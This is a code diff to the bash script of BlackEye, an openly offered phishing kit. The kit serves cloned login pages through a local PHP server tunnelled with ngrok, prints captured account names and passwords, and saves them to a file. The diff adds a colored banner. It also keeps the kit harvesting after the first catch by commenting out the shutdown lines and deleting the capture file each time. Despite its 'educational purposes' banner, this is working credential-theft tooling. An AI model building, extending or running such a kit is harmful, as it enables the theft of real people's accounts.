@@ -4,6 +4,13 @@
 # Upgraded by: @suljot_gjoka (https://github.com/whiteeagle0/blackeye)
 
 
+## ANSI colors (FG & BG)
+RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
+MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
+REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
+MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
+RESETBG="$(printf '\e[0m\n')"
+
 trap 'printf "\n";stop;exit 1' 2
 
 
@@ -219,6 +226,22 @@ printf "     \e[101m\e[1;77m:: Only use for educational purporses!!             
 printf "\n"
 printf "     \e[101m\e[1;77m::     BLACKEYE v1.5! By @suljot_gjoka & @thelinuxchoice     ::\e[0m\n"
 printf "\n"
+cat <<- EOF
+$BLUE'---/-....''       '...''  '-'            '-..''..-:-          '....'+MMMNo:+-.''''     '''            .-....'''''''''...-.'  ''      '..'''::-...''''''''''..'
+ oMMNMNNmmmmdhys+:. +NNmddhhmM:           .mNNmmmmNMMh'      ./ydmNNmdhNs/-'hMNmdmmd    :dddhyyh/       sMNmmmmmdddddmmmmmNmdhhdds     yNmmdmMNMNmmmmddddddmmmmy
+ 'oMMMMMMMMMMMMMMMmo'sMMMMMMNs.           /MMMMMMMMMM'     'omMMMNNNNMMMNh: 'NMMMMM+  .sNMMMMMm+-       'NMMMMMMMMMMMMMMMm-sNMMMMM/  'oNMMMMms/MMMMMMMMMMMMMMMMy
+  'NMMMMms/hNMMMMMMM.'mMMMMMo             sMMMMMMMMMM/    .dMMNy+/++/+yNMMMo'dMMMMM.'+mMMMMNhh/          hMMMMMMdyo+++osdm' :dMMMMMo/dMMMMNo. 'NMMMMMMdyo++ooymh
+   mMMMM+  '-dMMMMNo  yMMMMM.            .NMMMModMMMMd    hMMh-+smMMNdo-ydoo.dMMMMMomMMMMMM:             yMMMMMM+:::://+s-   'sMMMMMMMMMMN:    mMMMMMM/:-:://+o'
+   mMMMMNhyydMMMMmo.  oMMMMM.            yMMMMd 'dMMMM/  :MMm'sm/hMMMMMy     hMMMMMMMMMMMMM+             yMMMMMMMMMMMMMMM/     +NMMMMMMMN:     mMMMMMMMMMMMMMMM.
+   dMMMMMNNNMMMMMMMN+ /MMMMM:           +MMMMN-  -NMMMm' oMMh mMMMMMMMMm'    hMMMMMMMMMMMMMN:            yMMMMMMNNNNNNNNN/      yMMMMMMMo      dMMMMMMNNNNNNNNN.
+   dMMMMy.'.ydMMMMMMN'/MMMMMm..''''    :NMMMMMdhyyNMMMMs +MMM:/NMMMMMMN+-yssoyMMMMMMMs+NMMMMN:           sMMMMMMs'''''.--       /MMMMMMm       dMMMMMM/''''..--
+   mMMMMm-'''/MMMMMMh +MMMMMMMMNmmdy- :NMMMMMNNNNNNMMMMM+'dMMNo:ohddho:+NMMMosMMMMMN/  /NMMMMN:          sMMMMMMm///////oo'     'NMMMMMy       dMMMMMMh:::////o+
+  'syyyyyyo+oyyyyyso' /yyyyyyyyyyyyy/-syyyyy+-'''.-oyyyyy-.osyys/-..-/syyys+ /yyyyy+    /yyyyys.         /yyyyyyyyyyyyyyys'      syyyyy+       oyyyyyyyyyyyyyyyo
+  ydddhhhhhhhhyys/.  .hdhysooooosssyhdhhhhhhhh-    .hhhyhhhh- :shhddhhhhy+.   yhhhhhh'    :dhhhhhdd-     :ddhhhhhhhhhhhhhhy     .yddddddd/    -hdhhhhhhhhhhhhhhds
+ :oo:.               /o.           ':.''   '.      .'   '--    '--:-..       ..'  ''     ':.''''::      '++'        ''..-.     'ss+//:/+-    '/+-         '..-+/
+	EOF
+printf "\n"
+printf "\n"
 }
 
 createpage() {
@@ -274,9 +297,9 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
 cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
-killall -2 php > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-exit 1
+#killall -2 php > /dev/null 2>&1
+#killall -2 ngrok > /dev/null 2>&1
+#exit 1
 
 }
 
@@ -288,6 +311,7 @@ while [ true ]; do
 if [[ -e "sites/$server/usernames.txt" ]]; then
 printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
 catch_cred
+rm -rf sites/$server/usernames.txt
 
 fi
 sleep 1
@@ -425,10 +449,17 @@ exit 1
 fi
 fi
 fi
+startup_site
+startup_ngrok
+}
 
+startup_site() {
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
 sleep 2
+}
+startup_ngrok() {
+{ sleep 1; startup_server; }
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
